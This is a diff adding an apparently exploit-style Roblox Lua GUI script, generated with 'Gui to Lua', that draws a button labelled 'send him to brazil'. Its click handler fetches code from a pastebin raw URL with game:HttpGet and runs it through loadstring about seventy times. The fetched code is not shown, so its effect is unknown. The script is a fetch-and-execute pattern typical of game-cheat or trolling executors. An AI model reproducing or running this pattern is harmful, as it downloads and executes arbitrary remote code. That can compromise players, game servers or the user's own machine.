@@ -1,0 +1,196 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local cornybutton = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.438005388, 0, 0.365226328, 0)
+Frame.Size = UDim2.new(0, 186, 0, 87)
+
+cornybutton.Name = "corny button"
+cornybutton.Parent = Frame
+cornybutton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+cornybutton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+cornybutton.BorderSizePixel = 0
+cornybutton.Position = UDim2.new(0.129032254, 0, 0.130897254, 0)
+cornybutton.Size = UDim2.new(0, 138, 0, 62)
+cornybutton.Font = Enum.Font.SourceSansBold
+cornybutton.Text = "send him to brazil"
+cornybutton.TextColor3 = Color3.fromRGB(170, 0, 0)
+cornybutton.TextSize = 18.000
+
+-- Scripts:
+
+local function XELJ_fake_script() -- cornybutton.Script 
+	local script = Instance.new('Script', cornybutton)
+
+	function Click(mouse)
+	
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+	    loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+	    loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+		loadstring(game:HttpGet("https://pastebin.com/raw/XpwzwdsN"))()
+	
+	
+	end
+	
+	
+	script.Parent.MouseButton1Down:connect(Click)
+end
+coroutine.wrap(XELJ_fake_script)()
